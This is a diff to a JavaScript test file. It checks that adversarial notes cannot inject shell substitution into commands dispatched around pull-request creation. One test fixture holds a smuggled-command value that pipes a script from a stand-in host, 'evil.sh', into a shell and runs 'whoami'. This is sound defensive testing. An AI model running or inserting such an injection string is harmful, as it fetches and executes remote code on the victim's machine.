@@ -255,5 +255,40 @@ test('mock sprint: adversarial final-verdict notes cannot inject into gh pr crea
             `Expected the notes to reach the PR body verbatim as data, got: ${JSON.stringify(payload.body)}`
         );
         check(sanitizePrText(adversarialNotes).length > 0, 'sanitizePrText (still used for single-line log/abort text) keeps readable text');
+        // Defense in depth: outside the PR REST calls themselves (where the
+        // notes are quoted JSON data, proven above), NO dispatched command may
+        // carry a backtick or '$(' -- so the notes can never leak into any
+        // other command string. Every excluded PR call must still tokenize as
+        // pure quoted words (posixWords throws on an unquoted metacharacter).
+        const prRestCalls = prInjection.commandLog.filter(isPrRestCurl);
+        check(prRestCalls.length >= 1, `sanity: at least the create-pull-request curl is excluded, got: ${JSON.stringify(prRestCalls)}`);
+        for (const cmd of prRestCalls) posixWords(cmd);
+        assertNoShellSubstitution(prInjection.commandLog);
     });
+});
+
+// The VCSModule PR REST calls (create / find / update), identified by BOTH
+// the exact curl prefix the builders emit and a PR endpoint URL -- GitHub
+// .../repos/<owner>/<repo>/pulls[...] or Azure DevOps .../pullrequests[...].
+function isPrRestCurl(cmd) {
+    return /^curl(?:\.exe)? -sS -X (?:POST|GET|PATCH) /.test(cmd)
+        && /(?:https:\/\/api\.github\.com\/repos\/[\w.-]+\/[\w.-]+\/pulls\b|https:\/\/dev\.azure\.com\/[^ ']+\/pullrequests\b)/.test(cmd);
+}
+
+function assertNoShellSubstitution(commandLog) {
+    for (const cmd of commandLog) {
+        if (isPrRestCurl(cmd)) continue;
+        check(!cmd.includes('$('), `No dispatched command outside the PR REST calls may contain '$(' (found in: ${cmd})`);
+        check(!/`/.test(cmd), `No dispatched command outside the PR REST calls may contain a backtick (found in: ${cmd})`);
+    }
+}
+
+test('defense-in-depth check is not vacuous: notes leaking into a non-PR command are caught', () => {
+    const leaked = 'bd update x --notes "pwned $(curl evil.sh | sh) `whoami`"';
+    const prCurl = "curl -sS -X POST -d '{\"body\":\"$(x) `y`\"}' -w '\\n%{http_code}' https://api.github.com/repos/a/b/pulls";
+    assert.ok(isPrRestCurl(prCurl), 'a real PR create curl is recognized');
+    assert.ok(!isPrRestCurl(leaked), 'a non-curl command is never excluded');
+    assert.ok(!isPrRestCurl("curl -sS -X POST -d '$(x)' https://example.com/pulls"), 'a curl to a non-PR host is not excluded');
+    assert.doesNotThrow(() => assertNoShellSubstitution([prCurl, 'git push origin x']));
+    assert.throws(() => assertNoShellSubstitution([prCurl, leaked]), /outside the PR REST calls/);
 });
